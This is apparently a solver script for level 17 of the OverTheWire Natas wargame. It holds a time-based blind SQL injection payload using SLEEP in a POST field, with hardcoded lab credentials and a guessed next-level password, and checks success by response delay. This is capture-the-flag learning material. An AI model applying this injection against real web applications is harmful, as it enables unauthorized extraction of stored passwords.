#!/bin/python3

import requests
import re
import html.parser
import time

start = time.time()
username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
nextpass = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"#not 100% on this one
url = 'http://%s.natas.labs.overthewire.org' % (username)

data = { "username" : 'natas18" AND BINARY password LIKE "'+ nextpass +'" AND SLEEP(2)#' ,"submit":"Search" }

session = requests.Session()
response = session.post(url + '', data = data,auth = (username,password) )
end = time.time()
split = end-start

if split > 2:
    print ("password found")
    print ("this script just confirms that the password works") 
    print ("bruteforcegrep16.py will run through how the password was retrieved")
else:
    print ("password not found")
    print ("check bruteforcegrep16.py for issues")
